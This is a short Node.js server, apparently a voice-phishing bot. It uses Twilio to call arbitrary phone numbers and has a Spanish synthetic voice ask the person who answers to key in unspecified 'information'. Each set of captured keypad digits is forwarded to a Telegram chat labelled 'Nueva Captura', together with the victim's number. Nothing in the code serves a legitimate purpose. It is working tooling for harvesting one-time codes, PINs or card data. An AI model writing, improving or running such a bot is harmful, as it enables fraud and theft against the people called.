const express = require('express');
const twilio = require('twilio');
const axios = require('axios');
const app = express();
app.use(express.urlencoded({ extended: true }));

// 1. Variables de Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TWILIO_SID = process.env.TWILIO_SID;
const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN;
const TWILIO_NUMERO = process.env.TWILIO_NUMERO;

const client = twilio(TWILIO_SID, TWILIO_AUTH_TOKEN);

// 2. CUANDO ENTRA UNA LLAMADA - El bot habla
app.post('/voice', (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({language: 'es-CO', voice: 'Polly.Lucia'}, 'Digite la información y presione numeral');
  twiml.gather({ 
    input: 'dtmf',
    timeout: 10,
    numDigits: 20,
    finishOnKey: '#',
    action: '/resultado'
  });
  twiml.say({language: 'es-CO'}, 'No recibí datos. Adios');
  twiml.hangup();
  res.type('text/xml');
  res.send(twiml.toString());
});

// 3. CUANDO EL USUARIO MARCA - Se envía a Telegram
app.post('/resultado', async (req, res) => {
  const digits = req.body.Digits;
  const from = req.body.From;
  
  const mensaje = `📞 Nueva Captura\nDe: ${from}\nDatos: ${digits}`;
  
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje
    });
    console.log("Enviado a Telegram:", digits);
  } catch (error) {
    console.log("Error enviando a Telegram:", error.message);
  }
  
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({language: 'es-CO', voice: 'Polly.Lucia'}, 'Información recibida. Gracias');
  twiml.hangup();
  res.type('text/xml');
  res.send(twiml.toString());
});

// 4. NUEVO: PARA QUE EL BOT LLAME - Entra a /llamar/+57300xxxxxxx
app.get('/llamar/:numero', async (req, res) => {
  try {
    await client.calls.create({
      to: req.params.numero, // A quien llamar
      from: TWILIO_NUMERO, // Tu número de Twilio
      url: 'https://llamadassinlimites.onrender.com/voice' // Que ruta ejecutar
    });
    res.send(`Llamando a ${req.params.numero}...`);
  } catch (error) {
    res.send("Error: " + error.message);
  }
});

// 5. Prender server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Bot corriendo en puerto', PORT));
